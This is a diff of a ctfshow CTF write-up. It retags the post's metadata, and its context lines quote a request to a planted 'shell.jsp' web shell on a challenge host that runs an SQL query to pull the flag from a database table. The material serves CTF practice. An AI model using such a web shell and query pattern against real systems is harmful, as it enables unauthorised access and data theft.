@@ -6,8 +6,8 @@ date: "2024-12-19T20:54:37"
 lastmod: "2024-12-19T20:54:37"
 image: ""
 license: ""
-categories: ["ctfshow"]
-tags: ["php", "Java"]
+categories: ["赛题"]
+tags: ["ctfshow"]
 ---
 ## web签到
 
@@ -293,4 +293,3 @@ https://edb22801-1d6f-4cd0-b7ea-8b0e5e2859ee.challenge.ctf.show/shell.jsp?driver
 
 https://edb22801-1d6f-4cd0-b7ea-8b0e5e2859ee.challenge.ctf.show/shell.jsp?driver=com.mysql.jdbc.Driver&url=jdbc:mysql://localhost:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC&sql=select group_concat(f1ag)t from app_flag_xxoo_non0;
 ```
-
